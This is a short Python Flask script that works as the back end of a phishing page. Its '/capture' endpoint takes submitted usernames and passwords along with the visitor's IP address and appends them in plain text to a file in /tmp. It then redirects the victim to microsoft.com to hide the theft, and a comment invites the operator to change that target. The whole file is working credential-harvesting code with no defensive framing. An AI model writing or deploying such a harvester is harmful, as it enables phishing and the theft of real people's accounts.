from flask import Flask, request, redirect

app = Flask(__name__)

# 🔧 Change this to wherever you want users to be redirected after submission
REDIRECT_URL = "https://microsoft.com"

@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr

    with open('/tmp/captured_creds.txt', 'a') as f:
        f.write(f"IP: {ip}, Username: {username}, Password: {password}\n")

    return redirect(REDIRECT_URL)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9999)
